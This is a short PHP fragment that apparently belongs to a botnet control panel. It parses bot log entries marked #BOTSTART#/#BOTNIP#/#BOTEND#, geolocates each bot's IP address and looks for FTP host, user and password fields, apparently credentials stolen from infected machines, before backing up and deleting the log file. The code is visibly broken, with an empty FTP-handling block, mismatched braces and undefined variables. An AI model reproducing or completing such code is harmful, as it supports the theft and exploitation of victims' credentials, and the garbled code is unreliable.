<?php

preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);

if(count($match) > 0){
	foreach($match as &$item){
		if(!empty($item[1])){
			preg_match('~^([a-zA-Z]+)(.*)~', $item[1], $matches);
			if(!empty($matches[1])){
				$prefix = $matches[1];
				$pdata = $matches[2];
			}else{
				$prefix = 'unknown';
				$pdata = 'unknown';
			}
		}else{
			$prefix = 'unknown';
			$pdata = 'unknown';
		}
		$prefix = strtoupper($prefix);
		$pdata = strtoupper($pdata);

		if(function_exists('geoip_record_by_name')){
			$geo_data = geoip_record_by_name($item[2]);
			$country = empty($geo_data['country_code']) ? 'UNK' : $geo_data['country_code'];
		}else{
			if(file_exists($dir['site'] . '/cache/geoip/')){
				$country = geoip_country_code_by_addr($gi, $item[2]);
			}

			if(empty($country)) $country = 'UNK';
		}

		$data = explode("\r\n", $item[3]);
		if(count($data) > 0){
				if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
				}
			}
		}
	}

	if($type == 'new'){
		copy($dir[$metod]['new'] . '/' . $file, $dir[$metod]['backup'] . '/' . rand(11111, 99999) . '_' . $file);
	}
	@unlink($dir[$metod][$type] . '/' . $file);
}

?>